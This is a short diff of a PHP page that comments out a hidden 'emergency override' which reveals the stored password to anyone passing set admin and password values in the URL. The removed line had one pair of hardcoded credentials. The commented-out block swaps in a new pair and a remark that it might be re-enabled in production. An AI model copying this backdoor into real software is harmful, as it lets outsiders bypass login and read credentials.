@@ -67,10 +67,10 @@ if(isset($_POST['submit'])) {
                 echo '<div style="font-size: 20px; color: green;" >Deactivate Successful</div>';
             }
 
-            // a way to break in
-            if((isset($_GET['admin']) && $_GET['admin'] == 'manks') && (isset($_GET['password']) && $_GET['password'] == 'vad')) {
+            /* a way to break in (Might be uncomented on production later)
+            if((isset($_GET['admin']) && $_GET['admin'] == 'frc') && (isset($_GET['password']) && $_GET['password'] == '1923')) {
                 nicedie("Password: $password <br>", 'System Administrator - Emergency Override');
-            }
+            } */
 
             ?>
 
